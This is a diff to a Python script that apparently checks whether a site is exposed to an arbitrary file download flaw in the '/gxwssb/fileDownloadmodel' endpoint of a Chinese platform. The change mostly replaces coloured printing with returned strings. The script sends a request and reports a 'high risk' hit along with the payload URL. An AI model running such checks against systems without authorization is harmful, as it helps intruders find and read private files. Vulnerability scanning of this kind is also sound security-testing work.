@@ -8,8 +8,8 @@ description: 文件/gxwssb/fileDownloadmodel中,参数name存在任意文件下�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class gxwssb_fileDownloadmodel_download_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class gxwssb_fileDownloadmodel_download_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在天津神州助平台通用型任意下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在天津神州助平台通用型任意下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = gxwssb_fileDownloadmodel_download_BaseVerify(sys.argv[1])
     testVuln.run()
